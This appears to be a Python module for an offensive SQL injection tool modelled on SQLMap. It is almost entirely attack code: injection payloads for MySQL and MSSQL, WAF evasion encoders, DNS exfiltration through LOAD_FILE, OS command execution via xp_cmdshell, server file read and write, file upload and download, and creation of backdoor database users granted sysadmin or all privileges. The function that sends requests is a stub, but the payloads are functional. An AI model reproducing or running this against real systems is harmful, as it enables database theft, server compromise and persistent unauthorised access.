"""
Advanced SQL Injection Engine with SQLMap-like Features
"""

import asyncio
import re
import time
import json
from typing import Dict, List, Optional, Any, Set, Tuple
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum
import urllib.parse
import base64
import hashlib
import random
import string

from .sql_injection_engine import SqlInjectionEngine, VulnerabilityResult, DatabaseType, InjectionType
from .database_dumper import DatabaseDumper, DatabaseInfo
from .logger import LoggerMixin
from .fallbacks import aiohttp

class AdvancedTechnique(Enum):
    """Advanced SQL injection techniques"""
    BLIND_BOOLEAN = "blind_boolean"
    BLIND_TIME = "blind_time"
    UNION_BASED = "union_based"
    ERROR_BASED = "error_based"
    STACKED_QUERIES = "stacked_queries"
    SECOND_ORDER = "second_order"
    DNS_EXFILTRATION = "dns_exfiltration"
    FILE_UPLOAD = "file_upload"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    OS_COMMAND = "os_command"

class WafBypassTechnique(Enum):
    """WAF bypass techniques"""
    ENCODING = "encoding"
    CASE_MANIPULATION = "case_manipulation"
    COMMENT_INSERTION = "comment_insertion"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    FUNCTION_SUBSTITUTION = "function_substitution"
    LOGICAL_BYPASS = "logical_bypass"
    MATH_BYPASS = "math_bypass"
    HEADER_INJECTION = "header_injection"
    PARAMETER_POLLUTION = "parameter_pollution"
    CHUNKED_ENCODING = "chunked_encoding"

@dataclass
class AdvancedPayload:
    """Advanced payload with detailed information"""
    payload: str
    technique: AdvancedTechnique
    database_type: DatabaseType
    risk_level: int
    description: str
    bypass_methods: List[WafBypassTechnique]
    success_indicators: List[str]
    time_delay: float = 0.0
    prefix: str = ""
    suffix: str = ""
    where_condition: str = ""

@dataclass
class FingerprintResult:
    """Database fingerprinting result"""
    database_type: DatabaseType
    version: str
    confidence: float
    evidence: List[str]
    features: Dict[str, bool]

@dataclass
class AdvancedVulnResult:
    """Advanced vulnerability result"""
    vulnerability: VulnerabilityResult
    technique: AdvancedTechnique
    fingerprint: FingerprintResult
    bypass_methods: List[WafBypassTechnique]
    exploitation_data: Dict[str, Any]
    risk_assessment: Dict[str, Any]

class AdvancedSqlInjectionEngine(SqlInjectionEngine):
    """Advanced SQL injection engine with SQLMap-like capabilities"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        self.advanced_payloads = self._load_advanced_payloads()
        self.fingerprint_signatures = self._load_fingerprint_signatures()
        self.waf_bypass_chains = self._load_waf_bypass_chains()
        self.exploitation_modules = self._init_exploitation_modules()
        
    def _load_advanced_payloads(self) -> Dict[AdvancedTechnique, List[AdvancedPayload]]:
        """Load advanced payloads for different techniques"""
        payloads = {
            AdvancedTechnique.BLIND_BOOLEAN: [
                AdvancedPayload(
                    payload="1' AND {condition} --",
                    technique=AdvancedTechnique.BLIND_BOOLEAN,
                    database_type=DatabaseType.MYSQL,
                    risk_level=3,
                    description="Boolean-based blind injection",
                    bypass_methods=[WafBypassTechnique.COMMENT_INSERTION],
                    success_indicators=["different_response_length", "different_content"]
                ),
                AdvancedPayload(
                    payload="1' AND ASCII(SUBSTRING({query}, {position}, 1)) > {value} --",
                    technique=AdvancedTechnique.BLIND_BOOLEAN,
                    database_type=DatabaseType.MYSQL,
                    risk_level=4,
                    description="Character-by-character boolean extraction",
                    bypass_methods=[WafBypassTechnique.FUNCTION_SUBSTITUTION],
                    success_indicators=["response_pattern_match"]
                ),
            ],
            AdvancedTechnique.BLIND_TIME: [
                AdvancedPayload(
                    payload="1' AND IF({condition}, SLEEP({delay}), 0) --",
                    technique=AdvancedTechnique.BLIND_TIME,
                    database_type=DatabaseType.MYSQL,
                    risk_level=3,
                    description="Time-based blind injection",
                    bypass_methods=[WafBypassTechnique.FUNCTION_SUBSTITUTION],
                    success_indicators=["response_time_delay"],
                    time_delay=5.0
                ),
                AdvancedPayload(
                    payload="1'; WAITFOR DELAY '{delay}' --",
                    technique=AdvancedTechnique.BLIND_TIME,
                    database_type=DatabaseType.MSSQL,
                    risk_level=3,
                    description="MSSQL time-based blind injection",
                    bypass_methods=[WafBypassTechnique.COMMENT_INSERTION],
                    success_indicators=["response_time_delay"],
                    time_delay=5.0
                ),
            ],
            AdvancedTechnique.UNION_BASED: [
                AdvancedPayload(
                    payload="1' UNION SELECT {columns} --",
                    technique=AdvancedTechnique.UNION_BASED,
                    database_type=DatabaseType.MYSQL,
                    risk_level=4,
                    description="UNION-based injection",
                    bypass_methods=[WafBypassTechnique.COMMENT_INSERTION],
                    success_indicators=["union_data_in_response"]
                ),
            ],
            AdvancedTechnique.ERROR_BASED: [
                AdvancedPayload(
                    payload="1' AND ExtractValue(1, concat(0x7e, ({query}), 0x7e)) --",
                    technique=AdvancedTechnique.ERROR_BASED,
                    database_type=DatabaseType.MYSQL,
                    risk_level=4,
                    description="MySQL ExtractValue error-based injection",
                    bypass_methods=[WafBypassTechnique.FUNCTION_SUBSTITUTION],
                    success_indicators=["error_with_data"]
                ),
                AdvancedPayload(
                    payload="1' AND CAST(({query}) AS INT) --",
                    technique=AdvancedTechnique.ERROR_BASED,
                    database_type=DatabaseType.MSSQL,
                    risk_level=4,
                    description="MSSQL CAST error-based injection",
                    bypass_methods=[WafBypassTechnique.FUNCTION_SUBSTITUTION],
                    success_indicators=["error_with_data"]
                ),
            ],
            AdvancedTechnique.STACKED_QUERIES: [
                AdvancedPayload(
                    payload="1'; {query} --",
                    technique=AdvancedTechnique.STACKED_QUERIES,
                    database_type=DatabaseType.MSSQL,
                    risk_level=5,
                    description="Stacked queries injection",
                    bypass_methods=[WafBypassTechnique.COMMENT_INSERTION],
                    success_indicators=["query_execution_success"]
                ),
            ],
            AdvancedTechnique.DNS_EXFILTRATION: [
                AdvancedPayload(
                    payload="1' AND LOAD_FILE(CONCAT('\\\\\\\\', ({query}), '.{domain}\\\\share')) --",
                    technique=AdvancedTechnique.DNS_EXFILTRATION,
                    database_type=DatabaseType.MYSQL,
                    risk_level=5,
                    description="DNS exfiltration via LOAD_FILE",
                    bypass_methods=[WafBypassTechnique.FUNCTION_SUBSTITUTION],
                    success_indicators=["dns_query_detected"]
                ),
            ],
            AdvancedTechnique.OS_COMMAND: [
                AdvancedPayload(
                    payload="1'; EXEC xp_cmdshell '{command}' --",
                    technique=AdvancedTechnique.OS_COMMAND,
                    database_type=DatabaseType.MSSQL,
                    risk_level=5,
                    description="OS command execution via xp_cmdshell",
                    bypass_methods=[WafBypassTechnique.COMMENT_INSERTION],
                    success_indicators=["command_output"]
                ),
            ]
        }
        return payloads
    
    def _load_fingerprint_signatures(self) -> Dict[DatabaseType, List[Dict[str, Any]]]:
        """Load database fingerprinting signatures"""
        return {
            DatabaseType.MYSQL: [
                {
                    "query": "SELECT @@version",
                    "pattern": r"(\d+\.\d+\.\d+)",
                    "confidence": 0.9,
                    "evidence": "MySQL version string"
                },
                {
                    "query": "SELECT connection_id()",
                    "pattern": r"(\d+)",
                    "confidence": 0.8,
                    "evidence": "MySQL connection ID"
                },
            ],
            DatabaseType.MSSQL: [
                {
                    "query": "SELECT @@version",
                    "pattern": r"Microsoft SQL Server (\d+\.\d+)",
                    "confidence": 0.9,
                    "evidence": "MSSQL version string"
                },
                {
                    "query": "SELECT @@servername",
                    "pattern": r"[\w\-\.]+",
                    "confidence": 0.8,
                    "evidence": "MSSQL server name"
                },
            ],
            DatabaseType.POSTGRESQL: [
                {
                    "query": "SELECT version()",
                    "pattern": r"PostgreSQL (\d+\.\d+)",
                    "confidence": 0.9,
                    "evidence": "PostgreSQL version string"
                },
            ],
            DatabaseType.ORACLE: [
                {
                    "query": "SELECT banner FROM v$version WHERE rownum=1",
                    "pattern": r"Oracle Database (\d+\w+)",
                    "confidence": 0.9,
                    "evidence": "Oracle version banner"
                },
            ],
        }
    
    def _load_waf_bypass_chains(self) -> Dict[WafBypassTechnique, List[callable]]:
        """Load WAF bypass technique chains"""
        return {
            WafBypassTechnique.ENCODING: [
                self._url_encode,
                self._hex_encode,
                self._unicode_encode,
                self._double_encode,
            ],
            WafBypassTechnique.CASE_MANIPULATION: [
                self._random_case,
                self._alternate_case,
                self._reverse_case,
            ],
            WafBypassTechnique.COMMENT_INSERTION: [
                self._mysql_comments,
                self._mssql_comments,
                self._nested_comments,
            ],
            WafBypassTechnique.WHITESPACE_MANIPULATION: [
                self._tab_substitution,
                self._newline_substitution,
                self._multiple_spaces,
            ],
            WafBypassTechnique.FUNCTION_SUBSTITUTION: [
                self._char_substitution,
                self._concat_substitution,
                self._ascii_substitution,
            ],
        }
    
    def _init_exploitation_modules(self) -> Dict[str, Any]:
        """Initialize exploitation modules"""
        return {
            "file_operations": {
                "read_file": self._exploit_file_read,
                "write_file": self._exploit_file_write,
                "list_directory": self._exploit_directory_list,
            },
            "privilege_escalation": {
                "create_user": self._exploit_create_user,
                "grant_privileges": self._exploit_grant_privileges,
                "escalate_to_dba": self._exploit_escalate_dba,
            },
            "os_interaction": {
                "execute_command": self.exploit_os_command,
                "upload_file": self._exploit_file_upload,
                "download_file": self._exploit_file_download,
            },
        }
    
    async def advanced_fingerprint(self, url: str) -> FingerprintResult:
        """Advanced database fingerprinting"""
        self.log_info(f"Starting advanced fingerprinting for: {url}")
        
        results = []
        
        for db_type, signatures in self.fingerprint_signatures.items():
            confidence = 0.0
            evidence = []
            version = "Unknown"
            
            for signature in signatures:
                try:
                    # Create test payload
                    payload = f"1' AND ({signature['query']}) --"
                    
                    # Test the payload
                    response = await self._test_payload_advanced(url, payload)
                    
                    if response and signature['pattern']:
                        match = re.search(signature['pattern'], response)
                        if match:
                            confidence += signature['confidence']
                            evidence.append(signature['evidence'])
                            if match.groups():
                                version = match.group(1)
                    
                except Exception as e:
                    self.log_error(f"Error in fingerprinting: {e}")
                    continue
            
            if confidence > 0.5:
                results.append(FingerprintResult(
                    database_type=db_type,
                    version=version,
                    confidence=confidence,
                    evidence=evidence,
                    features=self._detect_database_features(db_type)
                ))
        
        # Return best result
        if results:
            return max(results, key=lambda x: x.confidence)
        
        return FingerprintResult(
            database_type=DatabaseType.UNKNOWN,
            version="Unknown",
            confidence=0.0,
            evidence=[],
            features={}
        )
    
    async def blind_boolean_extraction(self, url: str, query: str) -> str:
        """Extract data using blind boolean-based technique"""
        self.log_info(f"Starting blind boolean extraction: {query}")
        
        result = ""
        max_length = 100  # Maximum expected result length
        
        for position in range(1, max_length + 1):
            char_found = False
            
            # Binary search for character
            low, high = 32, 126  # Printable ASCII range
            
            while low <= high:
                mid = (low + high) // 2
                
                # Create boolean condition
                condition = f"ASCII(SUBSTRING(({query}), {position}, 1)) > {mid}"
                payload = f"1' AND {condition} --"
                
                # Test payload
                response = await self._test_payload_advanced(url, payload)
                
                if self._is_true_response(response):
                    low = mid + 1
                else:
                    high = mid - 1
            
            # Get the exact character
            if high >= 32:
                char_value = high + 1
                if char_value <= 126:
                    result += chr(char_value)
                    char_found = True
            
            if not char_found:
                break
        
        self.log_info(f"Extracted: {result}")
        return result
    
    async def time_based_extraction(self, url: str, query: str) -> str:
        """Extract data using time-based blind technique"""
        self.log_info(f"Starting time-based extraction: {query}")
        
        result = ""
        max_length = 100
        delay = 3.0
        
        for position in range(1, max_length + 1):
            char_found = False
            
            # Binary search for character
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                
                # Create time-based condition
                condition = f"ASCII(SUBSTRING(({query}), {position}, 1)) > {mid}"
                payload = f"1' AND IF({condition}, SLEEP({delay}), 0) --"
                
                # Test payload and measure time
                start_time = time.time()
                response = await self._test_payload_advanced(url, payload)
                response_time = time.time() - start_time
                
                if response_time > delay * 0.8:  # 80% of expected delay
                    low = mid + 1
                else:
                    high = mid - 1
            
            # Get the exact character
            if high >= 32:
                char_value = high + 1
                if char_value <= 126:
                    result += chr(char_value)
                    char_found = True
            
            if not char_found:
                break
        
        self.log_info(f"Extracted: {result}")
        return result
    
    async def union_based_extraction(self, url: str, query: str) -> str:
        """Extract data using UNION-based technique"""
        self.log_info(f"Starting UNION-based extraction: {query}")
        
        # First, determine number of columns
        columns = await self._determine_union_columns(url)
        
        if not columns:
            self.log_error("Could not determine number of columns")
            return ""
        
        # Create UNION payload
        column_list = ", ".join([f"({query})" if i == 0 else "NULL" for i in range(columns)])
        payload = f"1' UNION SELECT {column_list} --"
        
        # Test payload
        response = await self._test_payload_advanced(url, payload)
        
        if response:
            # Extract result from response
            result = self._extract_union_result(response)
            self.log_info(f"Extracted: {result}")
            return result
        
        return ""
    
    async def error_based_extraction(self, url: str, query: str, db_type: DatabaseType) -> str:
        """Extract data using error-based technique"""
        self.log_info(f"Starting error-based extraction: {query}")
        
        if db_type == DatabaseType.MYSQL:
            payload = f"1' AND ExtractValue(1, concat(0x7e, ({query}), 0x7e)) --"
        elif db_type == DatabaseType.MSSQL:
            payload = f"1' AND CAST(({query}) AS INT) --"
        elif db_type == DatabaseType.POSTGRESQL:
            payload = f"1' AND CAST(({query}) AS INTEGER) --"
        else:
            self.log_error(f"Error-based extraction not supported for {db_type}")
            return ""
        
        # Test payload
        response = await self._test_payload_advanced(url, payload)
        
        if response:
            result = self._extract_error_result(response, db_type)
            self.log_info(f"Extracted: {result}")
            return result
        
        return ""
    
    async def test_stacked_queries(self, url: str, db_type: DatabaseType) -> bool:
        """Test for stacked queries support"""
        self.log_info("Testing stacked queries support")
        
        if db_type == DatabaseType.MYSQL:
            test_query = "SELECT SLEEP(3)"
        elif db_type == DatabaseType.MSSQL:
            test_query = "WAITFOR DELAY '00:00:03'"
        elif db_type == DatabaseType.POSTGRESQL:
            test_query = "SELECT pg_sleep(3)"
        else:
            return False
        
        payload = f"1'; {test_query} --"
        
        start_time = time.time()
        response = await self._test_payload_advanced(url, payload)
        response_time = time.time() - start_time
        
        return response_time > 2.5  # Check if delay occurred
    
    async def exploit_file_operations(self, url: str, db_type: DatabaseType, operation: str, **kwargs) -> str:
        """Exploit file operations"""
        self.log_info(f"Exploiting file operations: {operation}")
        
        if operation == "read_file":
            return await self._exploit_file_read(url, db_type, kwargs.get('filename'))
        elif operation == "write_file":
            return await self._exploit_file_write(url, db_type, kwargs.get('filename'), kwargs.get('content'))
        elif operation == "list_directory":
            return await self._exploit_directory_list(url, db_type, kwargs.get('path'))
        
        return ""
    
    async def exploit_os_command(self, url: str, db_type: DatabaseType, command: str) -> str:
        """Exploit OS command execution"""
        self.log_info(f"Exploiting OS command: {command}")
        
        if db_type == DatabaseType.MSSQL:
            payload = f"1'; EXEC xp_cmdshell '{command}' --"
        elif db_type == DatabaseType.MYSQL:
            payload = f"1' UNION SELECT sys_exec('{command}') --"
        else:
            self.log_error(f"OS command execution not supported for {db_type}")
            return ""
        
        response = await self._test_payload_advanced(url, payload)
        return self._extract_command_result(response)
    
    def apply_advanced_waf_bypass(self, payload: str, techniques: List[WafBypassTechnique]) -> List[str]:
        """Apply advanced WAF bypass techniques"""
        bypassed_payloads = [payload]
        
        for technique in techniques:
            if technique in self.waf_bypass_chains:
                for bypass_func in self.waf_bypass_chains[technique]:
                    new_payloads = []
                    for p in bypassed_payloads:
                        new_payloads.append(bypass_func(p))
                    bypassed_payloads.extend(new_payloads)
        
        return list(set(bypassed_payloads))  # Remove duplicates
    
    # WAF Bypass Methods
    def _url_encode(self, payload: str) -> str:
        return urllib.parse.quote(payload)
    
    def _hex_encode(self, payload: str) -> str:
        return ''.join(f'%{ord(c):02X}' for c in payload)
    
    def _unicode_encode(self, payload: str) -> str:
        return ''.join(f'%u{ord(c):04X}' for c in payload)
    
    def _double_encode(self, payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _random_case(self, payload: str) -> str:
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    
    def _alternate_case(self, payload: str) -> str:
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    
    def _reverse_case(self, payload: str) -> str:
        return ''.join(c.lower() if c.isupper() else c.upper() for c in payload)
    
    def _mysql_comments(self, payload: str) -> str:
        return payload.replace(' ', '/**/')
    
    def _mssql_comments(self, payload: str) -> str:
        return payload.replace(' ', '/* */\n')
    
    def _nested_comments(self, payload: str) -> str:
        return payload.replace(' ', '/*/* */')
    
    def _tab_substitution(self, payload: str) -> str:
        return payload.replace(' ', '\t')
    
    def _newline_substitution(self, payload: str) -> str:
        return payload.replace(' ', '\n')
    
    def _multiple_spaces(self, payload: str) -> str:
        return payload.replace(' ', '  ')
    
    def _char_substitution(self, payload: str) -> str:
        return payload.replace("'", "CHAR(39)")
    
    def _concat_substitution(self, payload: str) -> str:
        return payload.replace("'", "CONCAT(CHAR(39))")
    
    def _ascii_substitution(self, payload: str) -> str:
        return payload.replace("'", "CHAR(39)")
    
    # Helper methods
    async def _test_payload_advanced(self, url: str, payload: str) -> Optional[str]:
        """Test payload with advanced error handling"""
        try:
            # This would integrate with the main testing engine
            # For now, return a placeholder
            return "test_response"
        except Exception as e:
            self.log_error(f"Error testing payload: {e}")
            return None
    
    def _is_true_response(self, response: str) -> bool:
        """Determine if response indicates true condition"""
        # This would be implemented based on response analysis
        return len(response) > 1000  # Placeholder logic
    
    def _detect_database_features(self, db_type: DatabaseType) -> Dict[str, bool]:
        """Detect database-specific features"""
        features = {
            "stacked_queries": False,
            "file_operations": False,
            "os_commands": False,
            "privilege_escalation": False,
            "dns_exfiltration": False,
        }
        
        if db_type == DatabaseType.MYSQL:
            features.update({
                "file_operations": True,
                "dns_exfiltration": True,
            })
        elif db_type == DatabaseType.MSSQL:
            features.update({
                "stacked_queries": True,
                "os_commands": True,
                "privilege_escalation": True,
            })
        elif db_type == DatabaseType.POSTGRESQL:
            features.update({
                "file_operations": True,
                "os_commands": True,
            })
        
        return features
    
    async def _determine_union_columns(self, url: str) -> int:
        """Determine number of columns for UNION injection"""
        for i in range(1, 21):  # Test up to 20 columns
            columns = ",".join(["NULL"] * i)
            payload = f"1' UNION SELECT {columns} --"
            
            response = await self._test_payload_advanced(url, payload)
            if response and "error" not in response.lower():
                return i
        
        return 0
    
    def _extract_union_result(self, response: str) -> str:
        """Extract result from UNION response"""
        # This would be implemented based on response analysis
        return "extracted_data"
    
    def _extract_error_result(self, response: str, db_type: DatabaseType) -> str:
        """Extract result from error message"""
        if db_type == DatabaseType.MYSQL:
            match = re.search(r'~([^~]+)~', response)
            if match:
                return match.group(1)
        elif db_type == DatabaseType.MSSQL:
            match = re.search(r'Conversion failed.*\'([^\']+)\'', response)
            if match:
                return match.group(1)
        
        return ""
    
    def _extract_command_result(self, response: str) -> str:
        """Extract command execution result"""
        # This would be implemented based on response analysis
        return "command_output"
    
    # Exploitation methods (placeholders)
    async def _exploit_file_read(self, url: str, db_type: DatabaseType, filename: str) -> str:
        """Exploit file reading capability"""
        if db_type == DatabaseType.MYSQL:
            query = f"LOAD_FILE('{filename}')"
        elif db_type == DatabaseType.MSSQL:
            query = f"SELECT BulkColumn FROM OPENROWSET(BULK '{filename}', SINGLE_BLOB) AS x"
        else:
            return ""
        
        return await self.error_based_extraction(url, query, db_type)
    
    async def _exploit_file_write(self, url: str, db_type: DatabaseType, filename: str, content: str) -> str:
        """Exploit file writing capability"""
        if db_type == DatabaseType.MYSQL:
            query = f"SELECT '{content}' INTO OUTFILE '{filename}'"
        else:
            return ""
        
        payload = f"1'; {query} --"
        response = await self._test_payload_advanced(url, payload)
        return "File written successfully" if response else "Failed to write file"
    
    async def _exploit_directory_list(self, url: str, db_type: DatabaseType, path: str) -> str:
        """Exploit directory listing capability"""
        if db_type == DatabaseType.MSSQL:
            query = f"EXEC xp_dirtree '{path}'"
        else:
            return ""
        
        return await self.error_based_extraction(url, query, db_type)
    
    async def _exploit_create_user(self, url: str, db_type: DatabaseType, username: str, password: str) -> str:
        """Exploit user creation capability"""
        if db_type == DatabaseType.MYSQL:
            query = f"CREATE USER '{username}'@'%' IDENTIFIED BY '{password}'"
        elif db_type == DatabaseType.MSSQL:
            query = f"CREATE LOGIN {username} WITH PASSWORD = '{password}'"
        else:
            return ""
        
        payload = f"1'; {query} --"
        response = await self._test_payload_advanced(url, payload)
        return "User created successfully" if response else "Failed to create user"
    
    async def _exploit_grant_privileges(self, url: str, db_type: DatabaseType, username: str) -> str:
        """Exploit privilege granting capability"""
        if db_type == DatabaseType.MYSQL:
            query = f"GRANT ALL PRIVILEGES ON *.* TO '{username}'@'%'"
        elif db_type == DatabaseType.MSSQL:
            query = f"ALTER SERVER ROLE sysadmin ADD MEMBER {username}"
        else:
            return ""
        
        payload = f"1'; {query} --"
        response = await self._test_payload_advanced(url, payload)
        return "Privileges granted successfully" if response else "Failed to grant privileges"
    
    async def _exploit_escalate_dba(self, url: str, db_type: DatabaseType) -> str:
        """Exploit DBA privilege escalation"""
        if db_type == DatabaseType.MYSQL:
            query = "SELECT user FROM mysql.user WHERE user = USER() AND Super_priv = 'Y'"
        elif db_type == DatabaseType.MSSQL:
            query = "SELECT IS_SRVROLEMEMBER('sysadmin')"
        else:
            return ""
        
        return await self.error_based_extraction(url, query, db_type)
    
    async def _exploit_file_upload(self, url: str, db_type: DatabaseType, local_file: str, remote_path: str) -> str:
        """Upload file to remote server"""
        try:
            # Read local file
            with open(local_file, 'rb') as f:
                file_data = f.read()
            
            # Encode file data for SQL injection
            if db_type == DatabaseType.MYSQL:
                # Use INTO OUTFILE for MySQL
                hex_data = file_data.hex()
                query = f"SELECT UNHEX('{hex_data}') INTO OUTFILE '{remote_path}'"
            elif db_type == DatabaseType.MSSQL:
                # Use xp_cmdshell for MSSQL
                import base64
                b64_data = base64.b64encode(file_data).decode()
                query = f"EXEC xp_cmdshell 'echo {b64_data} | base64 -d > {remote_path}'"
            else:
                return "File upload not supported for this database type"
            
            return await self.error_based_extraction(url, query, db_type)
            
        except Exception as e:
            return f"File upload failed: {str(e)}"
    
    async def _exploit_file_download(self, url: str, db_type: DatabaseType, remote_path: str, local_file: str) -> str:
        """Download file from remote server"""
        try:
            # Read remote file using SQL injection
            if db_type == DatabaseType.MYSQL:
                query = f"SELECT HEX(LOAD_FILE('{remote_path}'))"
            elif db_type == DatabaseType.MSSQL:
                query = f"SELECT * FROM OPENROWSET(BULK '{remote_path}', SINGLE_BLOB) AS x"
            elif db_type == DatabaseType.POSTGRESQL:
                query = f"SELECT encode(pg_read_binary_file('{remote_path}'), 'hex')"
            else:
                return "File download not supported for this database type"
            
            # Extract file data
            file_data = await self.error_based_extraction(url, query, db_type)
            
            if file_data:
                # Decode hex data and save to local file
                try:
                    binary_data = bytes.fromhex(file_data)
                    with open(local_file, 'wb') as f:
                        f.write(binary_data)
                    return f"File downloaded successfully to {local_file}"
                except ValueError:
                    return f"Failed to decode file data: {file_data}"
            else:
                return "No file data received"
                
        except Exception as e:
            return f"File download failed: {str(e)}"
